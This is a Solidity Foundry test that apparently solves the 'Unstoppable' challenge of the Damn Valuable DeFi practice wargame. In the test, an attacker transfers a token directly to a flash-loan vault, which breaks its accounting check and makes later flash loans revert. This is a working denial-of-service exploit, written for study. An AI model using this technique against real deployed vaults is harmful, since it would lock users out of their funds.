// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { UnstoppableVault } from "../src/UnstoppableVault.sol";
import { ReceiverUnstoppable } from "../src/ReceiverUnstoppable.sol";
import { DamnValuableToken } from "../src/DamnValuableToken.sol";
import "../lib/forge-std/src/Test.sol";

contract AuditTest is Test {
    UnstoppableVault vault;
    ReceiverUnstoppable receiver;
    DamnValuableToken token;

    address deployer;
    address user;
    address attacker;

    uint constant TOKENS_IN_VAULT = 1000000 ether;
    uint constant INITIAL_PLAYER_TOKEN_BALANCE = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        user = makeAddr("user");
        attacker = makeAddr("attacker");

        vm.startPrank(deployer);
        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, deployer, deployer);
        receiver = new ReceiverUnstoppable(address(vault));

        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, deployer);
        token.transfer(attacker, INITIAL_PLAYER_TOKEN_BALANCE);

        receiver.executeFlashLoan(100 ether);
        vm.stopPrank();
    }

    function testExpoilt() public {
        vm.prank(attacker);
        token.transfer(address(vault), 1 ether);

        vm.prank(deployer);
        vm.expectRevert();
        receiver.executeFlashLoan(100 ether);
    }
}